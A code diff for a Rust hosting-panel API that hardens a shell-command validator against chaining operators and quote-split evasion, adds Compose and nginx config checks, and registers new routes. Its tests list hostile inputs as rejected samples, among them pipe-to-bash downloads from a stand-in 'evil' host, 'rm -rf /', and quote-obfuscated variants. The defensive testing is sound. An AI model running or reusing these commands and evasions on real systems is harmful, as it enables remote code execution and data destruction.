@@ -12,7 +12,6 @@ pub mod branding_assets;
 pub mod cdn;
 pub mod dashboard;
 pub mod oauth;
-pub mod billing;
 pub mod crons;
 pub mod databases;
 pub mod deploy;
@@ -39,6 +38,7 @@ pub mod staging;
 pub mod sites;
 pub mod system_logs;
 pub mod teams;
+pub mod tls_certificates;
 pub mod ssl;
 pub mod system;
 pub mod terminal;
@@ -75,6 +75,17 @@ pub fn client_ip(headers: &HeaderMap) -> Option<String> {
         .and_then(|v| v.to_str().ok())
         .map(|s| s.split(',').next().unwrap_or(s).trim().to_string())
 }
+
+/// Failed webhook-secret attempts tolerated per deploy id before the route
+/// starts refusing, inside the one-hour window both webhook handlers roll.
+///
+/// It lives here because it has THREE readers that must agree: the git-deploy
+/// webhook, the site-deploy webhook, and the cleanup task in `main.rs`, which
+/// sheds zero-count entries above its cap and therefore has to know what a
+/// count "at the limit" is. They disagreed once already — the janitor evicted
+/// on a five-minute window while both handlers promised an hour — and a literal
+/// repeated in three files is how that happens.
+pub const WEBHOOK_ATTEMPT_LIMIT: u32 = 10;
 
 /// Validate a domain name format.
 pub fn is_valid_domain(domain: &str) -> bool {
@@ -248,6 +259,30 @@ pub fn is_safe_relative_path(path: &str) -> bool {
         && path.len() <= 4096
 }
 
+/// Reduce ordinary shell quoting/escaping so keyword-blocklist matching sees
+/// what the shell will actually run, not what was literally typed —
+/// `r'm' -rf /` and `w\get` contain no "rm -rf /"/"wget" substring, but the
+/// real shell this command eventually runs through (`sh -c` in
+/// `git_build.rs::run_hook` on the agent side) strips the quotes/backslashes
+/// before exec. Mirrors `dockpanel-agent`'s `command_filter::normalize_for_blocklist`,
+/// which this crate has no dependency path to reuse directly.
+fn normalize_for_blocklist(cmd: &str) -> String {
+    let mut out = String::with_capacity(cmd.len());
+    let mut chars = cmd.chars();
+    while let Some(c) = chars.next() {
+        match c {
+            '\'' | '"' => {}
+            '\\' => {
+                if let Some(next) = chars.next() {
+                    out.push(next);
+                }
+            }
+            _ => out.push(c),
+        }
+    }
+    out
+}
+
 /// Validate a shell command string for safety (used for cron, pre_build, post_deploy).
 /// Rejects dangerous shell metacharacters and patterns while allowing legitimate commands.
 pub fn is_safe_shell_command(cmd: &str) -> Result<(), &'static str> {
@@ -264,7 +299,61 @@ pub fn is_safe_shell_command(cmd: &str) -> Result<(), &'static str> {
         return Err("Command must not contain newlines");
     }
 
-    let lower = cmd.to_lowercase();
+    // A bare `;` always chains regardless of exit status; a bare (unpaired)
+    // `|` chains just as effectively — neither is caught by the verb-anchored
+    // patterns below (";bash", "| sh", ...), which never matched "id;whoami"
+    // or "id|whoami" (no space, no shell name). `&&`/`||` remain allowed for
+    // legitimate multi-step commands (e.g. "migrate && cache:clear"): only a
+    // run of `|` whose length isn't exactly 2 is rejected.
+    if cmd.contains(';') {
+        return Err("Command must not contain a bare ; (use && or || to chain)");
+    }
+    {
+        let bytes = cmd.as_bytes();
+        let mut i = 0;
+        while i < bytes.len() {
+            if bytes[i] == b'|' {
+                let start = i;
+                while i < bytes.len() && bytes[i] == b'|' {
+                    i += 1;
+                }
+                if i - start != 2 {
+                    return Err("Command must not contain a bare | (use || to chain)");
+                }
+            } else {
+                i += 1;
+            }
+        }
+    }
+    // A bare `&` backgrounds a command and, mid-string, acts as a chain
+    // separator exactly like `;`/`|` — "id&whoami" runs both, unpatched by
+    // either the `;` check or the `|` scan above. Only a PAIRED `&&` is the
+    // legitimate operator; scan runs of `&` the same way runs of `|` are
+    // scanned above.
+    // A bare `&` backgrounds a command and, mid-string, acts as a chain
+    // separator exactly like `;`/`|` — "id&whoami" runs both, unpatched by
+    // either the `;` check or the `|` scan above. Only a PAIRED `&&` is the
+    // legitimate operator; scan runs of `&` the same way runs of `|` are
+    // scanned above.
+    {
+        let bytes = cmd.as_bytes();
+        let mut i = 0;
+        while i < bytes.len() {
+            if bytes[i] == b'&' {
+                let start = i;
+                while i < bytes.len() && bytes[i] == b'&' {
+                    i += 1;
+                }
+                if i - start != 2 {
+                    return Err("Command must not contain a bare & (use && to chain)");
+                }
+            } else {
+                i += 1;
+            }
+        }
+    }
+
+    let lower = normalize_for_blocklist(cmd).to_lowercase();
 
     // Block injection patterns
     let dangerous = [
@@ -336,6 +425,66 @@ pub fn is_safe_shell_command(cmd: &str) -> Result<(), &'static str> {
     }
 
     Ok(())
+}
+
+/// Every image reference a Compose document would run, in declaration order.
+///
+/// Read here rather than from the agent's `/apps/compose/parse` so the deploy
+/// gate can refuse before anything is claimed, created or sent to a host — and
+/// so a compose door pays no round trip when the gate is switched off. Parsed
+/// the same way [`validate_compose_yaml`] parses it, for the same reason: a
+/// string scan is bypassable with anchors, aliases and alternate quoting.
+///
+/// A service built from a `build:` context has no image reference to check and
+/// is skipped; it is not a registry image and no scan can exist for it.
+pub fn compose_images(yaml: &str) -> Vec<String> {
+    let Ok(doc) = serde_yaml_ng::from_str::<serde_yaml_ng::Value>(yaml) else {
+        return Vec::new();
+    };
+    let Some(services) = doc.get("services").and_then(|s| s.as_mapping()) else {
+        return Vec::new();
+    };
+    services
+        .iter()
+        .filter_map(|(_, svc)| svc.get("image").and_then(|v| v.as_str()))
+        .map(|s| s.trim().to_string())
+        .filter(|s| !s.is_empty())
+        .collect()
+}
+
+/// The services the agent will SILENTLY DROP — those naming no image.
+///
+/// The compose engine deserialises each service into a struct whose `image` is
+/// an `Option<String>` and skips the service outright when it is `None`. That
+/// service never becomes a container, so the deploy comes up missing exactly
+/// the part the author cared about while every status the panel writes says the
+/// deploy succeeded. Naming them lets a door refuse instead.
+///
+/// ⚠ The predicate has to be the AGENT'S question, not a similar one. The agent
+/// reads a typed `Option<String>`; this side reads an untyped YAML value, and
+/// the two disagree about YAML null. `image:` written with no value — the
+/// ordinary way an author blanks the line while switching a service over to
+/// `build:` — is `Some(Value::Null)` here and `None` there, so a predicate
+/// spelled `.get("image").is_none()` reports nothing while the agent drops the
+/// service. Measured over `image:`, `image: ~`, `image: ""`, `image: "   "`, a
+/// missing key and a fully-populated file; only the arm below agrees with the
+/// agent on all six.
+///
+/// The empty-string spellings are deliberately NOT included: the agent does not
+/// skip those, it tries to create a container from them, so refusing here would
+/// refuse a file the agent still deploys.
+pub fn compose_services_without_image(yaml: &str) -> Vec<String> {
+    let Ok(doc) = serde_yaml_ng::from_str::<serde_yaml_ng::Value>(yaml) else {
+        return Vec::new();
+    };
+    let Some(services) = doc.get("services").and_then(|s| s.as_mapping()) else {
+        return Vec::new();
+    };
+    services
+        .iter()
+        .filter(|(_, svc)| matches!(svc.get("image"), None | Some(serde_yaml_ng::Value::Null)))
+        .filter_map(|(name, _)| name.as_str().map(str::to_string))
+        .collect()
 }
 
 /// Validate a Docker Compose YAML for dangerous directives.
@@ -467,12 +616,192 @@ pub fn is_safe_nginx_config(config: &str) -> Result<(), &'static str> {
         }
     }
 
+    // Directives the site template already writes at SERVER level, into the same
+    // `server { … }` block this text is injected into. nginx refuses a duplicate
+    // outright, so accepting one produced a configuration it rejects — and the
+    // agent's copy of this check runs inside the template RENDER, whose failure
+    // reaches the operator as `Operation failed. Reference: <uuid>` (agent_error
+    // hands a sentence through only on 4xx). Refused here so the reason survives
+    // the trip: this path answers 400 and `err(…)` carries the text.
+    //
+    // Three names, derived rather than guessed: `add_header` and `gzip_types` are
+    // emitted there too and legitimately repeat, and `expires` is emitted only
+    // inside `location` blocks, which is a different context.
+    for stmt in config.split(';') {
+        let directive = stmt
+            .trim()
+            .split(|c: char| c.is_whitespace())
+            .next()
+            .unwrap_or("")
+            .to_lowercase();
+        match directive.as_str() {
+            "client_max_body_size" => {
+                return Err(
+                    "The site already sets 'client_max_body_size' — nginx refuses a \
+                            duplicate and the whole site would fail to load. Change the site's \
+                            maximum upload size instead; that is the control that writes it.",
+                );
+            }
+            "gzip" | "gzip_min_length" => {
+                return Err(
+                    "The site already enables gzip — nginx refuses a duplicate 'gzip' or \
+                            'gzip_min_length' and the whole site would fail to load. Compression \
+                            is on for every site already.",
+                );
+            }
+            _ => {}
+        }
+    }
+
     Ok(())
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    // ── is_safe_shell_command (cron / pre_build_cmd / post_deploy_cmd save-time gate) ──
+
+    /// `dockpanel-fanout` s429: a bare `;`/`|` (no trailing space, no "sh"/
+    /// "bash" suffix) passed straight through the old verb-anchored dangerous
+    /// list — `is_safe_shell_command("id;whoami")` returned `Ok(())`. This is
+    /// the SAME gap as the agent-side `is_safe_cron_command` fix (both share
+    /// the identical bypass shape), on the save-time side used by cron,
+    /// pre_build_cmd, and post_deploy_cmd. `&&`/`||` must keep working.
+    #[test]
+    fn shell_command_rejects_bare_chain_operators_keeps_paired_operators() {
+        assert!(is_safe_shell_command("id;whoami").is_err());
+        assert!(is_safe_shell_command("id|whoami").is_err());
+        assert!(is_safe_shell_command("id ;whoami").is_err());
+        assert!(is_safe_shell_command("id; whoami").is_err());
+        assert!(is_safe_shell_command("legit-command;curl http://x/y|bash").is_err());
+        assert!(is_safe_shell_command("a|||b").is_err());
+        assert!(is_safe_shell_command("php artisan migrate && php artisan cache:clear").is_ok());
+        assert!(is_safe_shell_command("backup.sh || notify-fail.sh").is_ok());
+        assert!(is_safe_shell_command("npm install").is_ok());
+    }
+
+    #[test]
+    fn shell_command_rejects_bare_ampersand_keeps_paired() {
+        // The completeness-critic's executed PoC strings: `;` and `|` were fixed,
+        // `&` was not — a bare `&` chains just as effectively (background + continue).
+        assert!(is_safe_shell_command("id&whoami").is_err());
+        assert!(is_safe_shell_command("id & whoami").is_err());
+        assert!(is_safe_shell_command("echo hi & id > /tmp/pwned").is_err());
+        assert!(is_safe_shell_command("a&&&b").is_err());
+        assert!(is_safe_shell_command("backup.sh && verify.sh").is_ok());
+        assert!(is_safe_shell_command("a && b && c").is_ok());
+    }
+
+    /// `dockpanel-fanout` s454 completeness critic: this function had no
+    /// quote/backslash normalization at all, so `r'm' -rf /` and `w\get`
+    /// contain no "rm -rf /"/"wget" substring and pass every dangerous-
+    /// pattern list below — the same gap the agent-side
+    /// `command_filter::normalize_for_blocklist` was already built to close
+    /// for its own siblings. This save-time gate guards cron/pre_build_cmd/
+    /// post_deploy_cmd, whose values are eventually shell-executed.
+    #[test]
+    fn shell_command_rejects_quote_split_evasion() {
+        assert!(is_safe_shell_command("rm -rf /").is_err());
+        assert!(is_safe_shell_command("r'm' -rf /").is_err());
+        assert!(is_safe_shell_command("r\"m\" -rf /").is_err());
+        assert!(is_safe_shell_command("cu''rl http://evil|bash").is_err());
+        assert!(is_safe_shell_command("w\\get -qO- http://evil").is_err());
+        // Legitimate commands must still pass.
+        assert!(is_safe_shell_command("npm run build").is_ok());
+        assert!(is_safe_shell_command("echo 'deployed'").is_ok());
+    }
+
+    // ── Compose image extraction (the deploy gate's input) ──────────────
+
+    #[test]
+    fn compose_images_reads_every_service() {
+        let yaml =
+            "services:\n  web:\n    image: nginx:1.27\n  db:\n    image: postgres:16-alpine\n";
+        let mut got = compose_images(yaml);
+        got.sort();
+        assert_eq!(
+            got,
+            vec!["nginx:1.27".to_string(), "postgres:16-alpine".to_string()]
+        );
+    }
+
+    #[test]
+    fn compose_images_survives_the_shapes_that_are_not_images() {
+        // A build-only service has no reference to gate on.
+        assert!(compose_images("services:\n  app:\n    build: .\n").is_empty());
+        // Malformed input is not a licence to deploy ungated — but it is also
+        // not this function's error to raise: validate_compose_yaml refuses it
+        // first, and every caller runs that.
+        assert!(compose_images("{{{").is_empty());
+        assert!(compose_images("version: '3'\n").is_empty());
+        // A whole-node alias DOES resolve, which is the reason this parses
+        // rather than greps — a string scan would see one image here.
+        let aliased = "services:\n  a: &base\n    image: redis:7\n  b: *base\n";
+        assert_eq!(compose_images(aliased).len(), 2);
+
+        // A `<<:` MERGE key does not, and that is safe rather than a bypass:
+        // the agent deserialises the same document with the same crate, so a
+        // service whose image arrives only through a merge key has no image on
+        // the agent's side either and never runs. The extractor and the thing
+        // it guards agree by construction — which is the property that matters,
+        // not whether either of them implements merge keys.
+        let merged = "services:\n  a: &base\n    image: redis:7\n  b:\n    <<: *base\n";
+        assert_eq!(compose_images(merged).len(), 1);
+    }
+
+    // ── The services the agent silently drops ───────────────────────────
+
+    #[test]
+    fn services_without_an_image_are_named() {
+        let yaml = "services:\n  web:\n    build: .\n  db:\n    image: postgres:16\n";
+        assert_eq!(
+            compose_services_without_image(yaml),
+            vec!["web".to_string()]
+        );
+        // Nothing to refuse when every service names an image.
+        let ok = "services:\n  web:\n    image: nginx\n  db:\n    image: postgres:16\n";
+        assert!(compose_services_without_image(ok).is_empty());
+    }
+
+    #[test]
+    fn a_blanked_image_line_is_the_same_defect_and_must_be_named_too() {
+        // ⚠ This is the case that decides the predicate, and it is the one an
+        // author actually writes: `image:` left with no value while switching a
+        // service to `build:`. Here that is `Some(Value::Null)`; on the agent it
+        // deserialises to `None` and the service is dropped. A predicate spelled
+        // `.get("image").is_none()` returns nothing for all three spellings
+        // below while the agent drops the service — the refusal would be green
+        // from birth against the ordinary spelling of the thing it refuses.
+        for yaml in [
+            "services:\n  web:\n    image:\n    build: .\n  db:\n    image: postgres:16\n",
+            "services:\n  web:\n    image: ~\n  db:\n    image: postgres:16\n",
+            "services:\n  web:\n    image: null\n  db:\n    image: postgres:16\n",
+        ] {
+            assert_eq!(
+                compose_services_without_image(yaml),
+                vec!["web".to_string()],
+                "a null image must be reported: {yaml}"
+            );
+        }
+    }
+
+    #[test]
+    fn an_empty_image_string_is_not_reported_because_the_agent_does_not_drop_it() {
+        // The agent deserialises `""` to `Some("")` and tries to create a
+        // container from it, so refusing here would refuse a file the agent
+        // still deploys. The two sides have to answer the SAME question, not
+        // two similar ones.
+        for yaml in [
+            "services:\n  web:\n    image: \"\"\n  db:\n    image: postgres:16\n",
+            "services:\n  web:\n    image: \"   \"\n  db:\n    image: postgres:16\n",
+        ] {
+            assert!(
+                compose_services_without_image(yaml).is_empty(),
+                "an empty image string is not the dropped-service defect: {yaml}"
+            );
+        }
+    }
 
     // ── Reserved (control-plane) domains — s241 H2/H3 ───────────────────
 
@@ -597,7 +926,32 @@ mod tests {
         assert!(is_safe_nginx_config("sendfile on; access_log /var/www/victim/public/shell.php;").is_err());
         assert!(is_safe_nginx_config("gzip on; error_log /var/www/x/y.php;").is_err());
         // A benign directive still passes.
-        assert!(is_safe_nginx_config("client_max_body_size 20m;").is_ok());
+        assert!(is_safe_nginx_config("proxy_read_timeout 120s;").is_ok());
+    }
+
+    /// This asserted the OPPOSITE until v2.122.1 — that `client_max_body_size
+    /// 20m;` is valid input — matching the agent-side test that made the same
+    /// claim. The site template writes that directive at server level, into the
+    /// same block this text lands in, so nginx refuses the result and the site
+    /// stops loading. Refused HERE as well as in the agent, because only this
+    /// path can hand the reason back to the operator: the agent's copy runs
+    /// inside the template render and surfaces as a 502 with a reference.
+    #[test]
+    fn nginx_config_refuses_what_the_site_template_already_sets() {
+        for stmt in [
+            "client_max_body_size 20m;",
+            "gzip on;",
+            "gzip_min_length 512;",
+            "  Client_Max_Body_Size 50m;",
+            "proxy_read_timeout 60s; gzip off;",
+        ] {
+            let e = is_safe_nginx_config(stmt).expect_err(stmt);
+            assert!(e.contains("already"), "{stmt} -> {e}");
+        }
+        // …and the ones that legitimately repeat are still accepted.
+        assert!(is_safe_nginx_config("add_header X-Extra 1;").is_ok());
+        assert!(is_safe_nginx_config("gzip_types application/wasm;").is_ok());
+        assert!(is_safe_nginx_config("expires 1d;").is_ok());
     }
 
     // ── Domain validation ───────────────────────────────────────────────
@@ -740,6 +1094,7 @@ pub fn router() -> Router<AppState> {
         .route("/api/auth/2fa/enable", post(auth::twofa_enable))
         .route("/api/auth/2fa/verify", post(auth::twofa_verify))
         .route("/api/auth/2fa/disable", post(auth::twofa_disable))
+        .route("/api/auth/2fa/recovery-codes", post(auth::twofa_regenerate_recovery_codes))
         .route("/api/auth/2fa/status", get(auth::twofa_status))
         // Passkeys / WebAuthn
         .route("/api/auth/passkey/register/begin", post(passkeys::register_begin))
@@ -757,18 +1112,30 @@ pub fn router() -> Router<AppState> {
         .route("/api/users/{id}", put(users::update).delete(users::remove))
         .route("/api/users/{id}/toggle-suspend", post(users::toggle_suspend))
         .route("/api/users/{id}/reset-password", post(users::reset_password))
+        .route("/api/users/{id}/reset-2fa", post(users::reset_2fa))
         // Sites
         .route("/api/sites", get(sites::list).post(sites::create))
+        // Read-only, admin-only, and the ONLY site read that looks past
+        // `user_id`. It is what makes `POST /api/sites/{id}/transfer` reversible
+        // — without it an admin who hands a site to a client cannot see the row
+        // again, and the Transfer control lives on a page that then 404s them.
+        .route("/api/admin/sites", get(sites::list_for_admin))
         .route("/api/sites/{id}", get(sites::get_one).delete(sites::remove))
         .route("/api/sites/{id}/provision-log", get(sites::provision_log))
         .route("/api/sites/{id}/php", put(sites::switch_php))
+        .route("/api/sites/{id}/runtime", put(sites::switch_runtime))
         .route("/api/sites/{id}/limits", put(sites::update_limits))
+        .route("/api/sites/{id}/bandwidth-usage", get(sites::bandwidth_usage))
         .route("/api/sites/{id}/domain", put(sites::rename_domain))
+        .route("/api/sites/{id}/transfer", post(sites::transfer))
         .route("/api/sites/{id}/toggle", put(sites::toggle_enabled))
         .route("/api/sites/{id}/fastcgi-cache", put(sites::toggle_fastcgi_cache))
         .route("/api/sites/{id}/fastcgi-cache/purge", post(sites::purge_fastcgi_cache))
         .route("/api/sites/{id}/redis-cache", put(sites::toggle_redis_cache))
         .route("/api/sites/{id}/redis-cache/purge", post(sites::purge_redis_cache))
+        .route("/api/sites/{id}/sftp/enable", post(sites::enable_sftp))
+        .route("/api/sites/{id}/sftp/disable", post(sites::disable_sftp))
+        .route("/api/sites/{id}/sftp/reset-password", post(sites::reset_sftp_password))
         .route("/api/sites/{id}/waf", put(sites::toggle_waf))
         .route("/api/sites/{id}/waf/logs", get(sites::waf_logs))
         .route("/api/sites/{id}/optimize-images", post(sites::optimize_images))
@@ -803,11 +1170,9 @@ pub fn router() -> Router<AppState> {
         .route("/api/sites/{id}/backups", get(backups::list).post(backups::create))
         .route("/api/sites/{id}/backups/{backup_id}/restore", post(backups::restore))
         .route("/api/sites/{id}/backups/{backup_id}", delete(backups::remove))
-        .route("/api/sites/{id}/restic/backup", post(backups::restic_backup))
-        .route("/api/sites/{id}/restic/snapshots", get(backups::restic_snapshots))
-        .route("/api/sites/{id}/restic/restore/{snapshot_id}", post(backups::restic_restore))
         // Backup Destinations (admin)
         .route("/api/backup-destinations", get(backup_destinations::list).post(backup_destinations::create))
+        .route("/api/backup-destinations/selectable", get(backup_destinations::selectable))
         .route("/api/backup-destinations/{id}", put(backup_destinations::update).delete(backup_destinations::remove))
         .route("/api/backup-destinations/{id}/test", post(backup_destinations::test_connection))
         // Backup Schedules
@@ -838,12 +1203,20 @@ pub fn router() -> Router<AppState> {
         .route("/api/databases/{id}/pitr", get(databases::pitr_config).put(databases::update_pitr_config))
         .route("/api/databases/{id}/pitr/restore", post(databases::pitr_restore))
         .route("/api/databases/{id}/reset-password", post(databases::reset_password))
+        .route("/api/databases/{id}/dumps", get(databases::dumps))
+        .route("/api/databases/{id}/import", post(databases::import))
         // Compose Stacks
         .route("/api/stacks", get(stacks::list).post(stacks::create))
         .route("/api/stacks/{id}", get(stacks::get_one).put(stacks::update).delete(stacks::remove))
         .route("/api/stacks/{id}/start", post(stacks::start))
         .route("/api/stacks/{id}/stop", post(stacks::stop))
         .route("/api/stacks/{id}/restart", post(stacks::restart))
+        // The Certificates page's control for a stack's certificate. A stack has
+        // no `sites` row, so the site-shaped renew route could never address one.
+        .route("/api/stacks/{id}/renew-ssl", post(stacks::renew_ssl))
+        // TLS certificate registry — named certificates a stack claims by alias (#104)
+        .route("/api/tls-certificates", get(tls_certificates::list).post(tls_certificates::create))
+        .route("/api/tls-certificates/{id}", put(tls_certificates::replace).delete(tls_certificates::remove))
         // Docker Apps (admin)
         .route("/api/apps/updates", get(docker_apps::check_updates))
         .route("/api/apps/gpu-info", get(docker_apps::gpu_info))
@@ -890,6 +1263,7 @@ pub fn router() -> Router<AppState> {
         .route("/api/git-deploys/{id}/deploy", post(git_deploys::deploy))
         .route("/api/git-deploys/{id}/rollback/{history_id}", post(git_deploys::rollback))
         .route("/api/git-deploys/{id}/history", get(git_deploys::history))
+        .route("/api/git-deploys/{id}/history/{history_id}/explain", post(git_deploys::explain_history))
         .route("/api/git-deploys/{id}/keygen", post(git_deploys::keygen))
         .route("/api/git-deploys/{id}/stop", post(git_deploys::stop))
         .route("/api/git-deploys/{id}/start", post(git_deploys::start))
@@ -926,6 +1300,8 @@ pub fn router() -> Router<AppState> {
         // Panel Fail2Ban Jail
         .route("/api/security/panel-jail/setup", post(security::setup_panel_jail))
         .route("/api/security/panel-jail/status", get(security::panel_jail_status))
+        .route("/api/security/canary-status", get(security::canary_status))
+        .route("/api/security/canary/arm", post(security::canary_arm))
         // Security Compliance Report
         .route("/api/security/report", get(security::compliance_report))
         // Security Hardening (post-incident features)
@@ -935,9 +1311,12 @@ pub fn router() -> Router<AppState> {
         .route("/api/security/panic", post(security::panic_button))
         .route("/api/security/forensic-snapshot", post(security::forensic_snapshot))
         .route("/api/security/audit-log", get(security::audit_log_list))
+        .route("/api/security/suspicious-events", get(security::suspicious_events_list))
         .route("/api/security/recordings", get(security::recordings_list))
         .route("/api/security/pending-users", get(security::pending_users))
         .route("/api/security/users/{id}/approve", post(security::approve_user))
+        .route("/api/security/unverified-users", get(security::unverified_users))
+        .route("/api/security/users/{id}/verify-email", post(security::verify_user_email))
         // Security Scanning
         .route("/api/security/scan", post(security_scans::trigger_scan))
         .route("/api/security/scans", get(security_scans::list_scans))
@@ -955,7 +1334,11 @@ pub fn router() -> Router<AppState> {
         .route("/api/sbom/install", post(sboms::install_scanner))
         .route("/api/sbom/uninstall", post(sboms::uninstall_scanner))
         .route("/api/sbom/generate", post(sboms::generate))
-        .route("/api/sbom/image/{image}", get(sboms::get_image_sbom))
+        // Wildcard, not a single segment: an image reference contains slashes
+        // (`ghcr.io/org/app:v1`), so `{image}` matched only the bare
+        // `name:tag` shape and 404'd for every registry-qualified image — which
+        // is most of the catalogue.
+        .route("/api/sbom/image/{*image}", get(sboms::get_image_sbom))
         .route("/api/apps/{name}/sbom", get(sboms::download_app_sbom).post(sboms::generate_app))
         // System
         .route("/api/health", get(system::health))
@@ -989,6 +1372,10 @@ pub fn router() -> Router<AppState> {
         .route("/api/settings/smtp/test", post(settings::test_email))
         .route("/api/settings/test-webhook", post(settings::test_webhook))
         .route("/api/settings/health", get(settings::health))
+        .route(
+            "/api/settings/credentials/reencrypt",
+            post(settings::reencrypt_credentials),
+        )
         .route("/api/settings/oauth-redirects", get(oauth::redirect_uris))
         // DNS Management
         // CDN Integration (BunnyCDN + Cloudflare CDN)
@@ -1010,13 +1397,13 @@ pub fn router() -> Router<AppState> {
         .route("/api/dns/zones/{id}/analytics", get(dns::dns_analytics))
         .route("/api/dns/zones/{id}/cf/settings", get(dns::cf_zone_settings).put(dns::cf_update_setting))
         .route("/api/dns/zones/{id}/cf/cache/purge", post(dns::cf_purge_cache))
-        .route("/api/tunnel/configure", post(dns::configure_tunnel))
-        .route("/api/tunnel/status", get(dns::tunnel_status))
         // WordPress Toolkit
         .route("/api/wordpress/sites", get(wordpress::all_wp_sites))
         .route("/api/wordpress/bulk-update", post(wordpress::bulk_update))
+        .route("/api/wordpress/vuln-scan-settings", get(wordpress::get_scan_settings).put(wordpress::update_scan_settings))
         .route("/api/sites/{id}/wordpress/vuln-scan", post(wordpress::vuln_scan))
         .route("/api/sites/{id}/wordpress/security-check", get(wordpress::security_check))
+        .route("/api/sites/{id}/wordpress/hardening-history", get(wordpress::hardening_history))
         .route("/api/sites/{id}/wordpress/harden", post(wordpress::wp_harden))
         // WordPress Management
         .route("/api/sites/{id}/wordpress", get(wordpress::info))
@@ -1038,6 +1425,7 @@ pub fn router() -> Router<AppState> {
         // Uptime Monitors
         .route("/api/monitors", get(monitors::list).post(monitors::create))
         .route("/api/monitors/certificates", get(monitors::certificate_dashboard))
+        .route("/api/admin/certificates", get(monitors::certificate_dashboard_for_admin))
         .route("/api/monitors/maintenance", get(monitors::list_maintenance).post(monitors::create_maintenance))
         .route("/api/monitors/maintenance/{id}", delete(monitors::delete_maintenance))
         .route("/api/monitors/{id}", put(monitors::update).delete(monitors::remove))
@@ -1046,10 +1434,6 @@ pub fn router() -> Router<AppState> {
         .route("/api/monitors/{id}/uptime", get(monitors::uptime_stats))
         .route("/api/monitors/{id}/chart", get(monitors::response_chart))
         .route("/api/monitors/{id}/check", post(monitors::force_check))
-        // Billing
-        .route("/api/billing/plan", get(billing::current_plan))
-        .route("/api/billing/checkout", post(billing::create_checkout))
-        .route("/api/billing/portal", post(billing::customer_portal))
         // Branding logo upload (admin)
         .route("/api/branding/logo", post(branding_assets::upload_logo))
         // Public endpoints (no auth)
@@ -1061,12 +1445,20 @@ pub fn router() -> Router<AppState> {
         .route("/api/status-page/public", get(incidents::public_status_page))
         .route("/api/webhooks/gateway/{token}", post(webhook_gateway::receive_webhook))
         .route("/api/status-page/subscribe", post(incidents::subscribe))
-        .route("/api/status-page/unsubscribe", post(incidents::unsubscribe))
+        // Both methods on purpose. The handler's own doc comment, the guide's
+        // prose and the guide's API table have all published DELETE since this
+        // shipped, while the route accepted POST only — so every reader who
+        // followed the documentation got a 405, and the one method that worked
+        // was named on no published surface. POST stays because the repo's own
+        // e2e calls it and removing it would break a working caller.
+        .route(
+            "/api/status-page/unsubscribe",
+            post(incidents::unsubscribe).delete(incidents::unsubscribe),
+        )
         .route("/api/terminal/shared/{id}", get(terminal::view_shared))
         // Heartbeat endpoint (no auth — monitor validates by ID)
         .route("/api/heartbeat/{monitor_id}/{token}", post(monitors::heartbeat))
         // Webhooks (no auth — validated by secret/signature)
-        .route("/api/webhooks/stripe", post(billing::webhook))
         .route("/api/webhooks/deploy/{site_id}/{secret}", post(deploy::webhook))
         // Staging Environments
         .route("/api/sites/{id}/staging", get(staging::get_staging).post(staging::create).delete(staging::destroy))
@@ -1101,8 +1493,11 @@ pub fn router() -> Router<AppState> {
         // /api/agent/version demanded `AuthUser`, a credential an agent cannot
         // hold; it 401'd on every request for four releases and the comment is a
         // large part of why nobody looked (s233). So, precisely:
-        //   /api/agent/version, /api/agent/commands, /api/agent/commands/result
+        //   /api/agent/version
         //     -> crate::auth::authenticate_agent + agent_rate_limit
+        //     (the remote-command channel this comment used to also name,
+        //     /api/agent/commands + /api/agent/commands/result, was removed —
+        //     it could never execute a command)
         //   /api/agent/checkin
         //     -> its OWN check (agent_checkin.rs): the server_id comes from the
         //        request BODY, the row is fetched by id, and the token is
@@ -1169,10 +1564,13 @@ pub fn router() -> Router<AppState> {
         .route("/api/drift", get(drift::report))
         // Notification Center
         .route("/api/notifications", get(notifications::list))
+        .route("/api/notifications/summary", get(notifications::summary))
         .route("/api/notifications/unread-count", get(notifications::unread_count))
         .route("/api/notifications/stream", get(notifications::stream))
         .route("/api/notifications/{id}/read", post(notifications::mark_read))
         .route("/api/notifications/read-all", post(notifications::mark_all_read))
+        .route("/api/notifications/read", delete(notifications::delete_read))
+        .route("/api/notifications/{id}", delete(notifications::delete_one))
         // Backup Orchestrator
         .route("/api/backup-orchestrator/all", get(backup_orchestrator::list_all_backups))
         .route("/api/backup-orchestrator/health", get(backup_orchestrator::health))
@@ -1196,10 +1594,10 @@ pub fn router() -> Router<AppState> {
         .route("/api/backup-orchestrator/storage-history", get(backup_orchestrator::storage_history))
         // Webhook Gateway
         .route("/api/webhook-gateway/endpoints", get(webhook_gateway::list_endpoints).post(webhook_gateway::create_endpoint))
-        .route("/api/webhook-gateway/endpoints/{id}", delete(webhook_gateway::delete_endpoint))
+        .route("/api/webhook-gateway/endpoints/{id}", put(webhook_gateway::set_endpoint_enabled).delete(webhook_gateway::delete_endpoint))
         .route("/api/webhook-gateway/endpoints/{id}/deliveries", get(webhook_gateway::list_deliveries))
         .route("/api/webhook-gateway/endpoints/{id}/routes", get(webhook_gateway::list_routes).post(webhook_gateway::create_route))
-        .route("/api/webhook-gateway/routes/{route_id}", delete(webhook_gateway::delete_route))
+        .route("/api/webhook-gateway/routes/{route_id}", put(webhook_gateway::set_route_enabled).delete(webhook_gateway::delete_route))
         .route("/api/webhook-gateway/deliveries/{delivery_id}/replay", post(webhook_gateway::replay_delivery))
         // IaC / Terraform provider
         .route("/api/iac/tokens", get(iac::list_tokens).post(iac::create_token))
@@ -1228,6 +1626,8 @@ pub fn router() -> Router<AppState> {
         .route("/api/secrets/vaults/{vault_id}/import", post(secrets::import_vault))
         // Incident Management
         .route("/api/incidents", get(incidents::list).post(incidents::create))
+        // Static segment, so matchit prefers it over `{id}` whatever the order here.
+        .route("/api/incidents/summary", get(incidents::summary))
         .route("/api/incidents/{id}", get(incidents::get_one).put(incidents::update).delete(incidents::remove))
         .route("/api/incidents/{id}/updates", get(incidents::list_updates).post(incidents::post_update))
         // Status Page Management
@@ -1254,8 +1654,6 @@ pub fn router() -> Router<AppState> {
         .route("/api/auto-updates/status", get(system::auto_updates_status))
         .route("/api/auto-updates/enable", post(system::enable_auto_updates))
         .route("/api/auto-updates/disable", post(system::disable_auto_updates))
-        // Panel IP Whitelist
-        .route("/api/panel-whitelist", get(system::get_panel_whitelist).post(system::set_panel_whitelist))
         // Service installers
         .route("/api/services/install-status", get(system::install_status))
         .route("/api/services/install/php", post(system::install_php))
@@ -1266,6 +1664,7 @@ pub fn router() -> Router<AppState> {
         .route("/api/services/install/redis", post(system::install_redis))
         .route("/api/services/install/nodejs", post(system::install_nodejs))
         .route("/api/services/install/composer", post(system::install_composer))
+        .route("/api/services/install/sshpass", post(system::install_sshpass))
